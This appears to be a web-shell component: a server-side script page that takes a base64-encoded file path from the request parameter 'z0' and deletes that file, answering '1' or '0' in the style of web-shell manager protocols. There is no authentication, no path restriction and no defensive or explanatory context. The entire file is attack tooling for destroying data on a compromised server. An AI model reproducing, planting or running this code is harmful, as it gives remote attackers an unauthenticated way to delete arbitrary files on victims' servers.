<%
(function() {
    response.setContentType("text/html");
    response.setCharacterEncoding("UTF-8");

    // 引入需要的 Java NIO 類別
    var Paths = java.nio.file.Paths;
    var Files = java.nio.file.Files;

    // 輸出輔助函式
    function output(msg) {
        if (typeof echo === 'function') {
            echo(msg);
        } else {
            out.print(msg);
        }
    }

    function base64_decode(str) {
        if (!str) return "";
        try {
            var decoder = java.util.Base64.getDecoder();
            var decodedBytes = decoder.decode(str);
            return new java.lang.String(decodedBytes, "UTF-8");
        } catch (e) {
            return "";
        }
    }

    var szEntry = base64_decode(request.getParameter("z0"));

    if (!szEntry) {
        output("0");
        return;
    }

    try {
        var path = Paths.get(szEntry);

        if (Files.exists(path)) {
            Files.delete(path);
            output("1");
        } else {
            output("0");
        }
    } catch (e) {
        output("0");
    }
})();
%>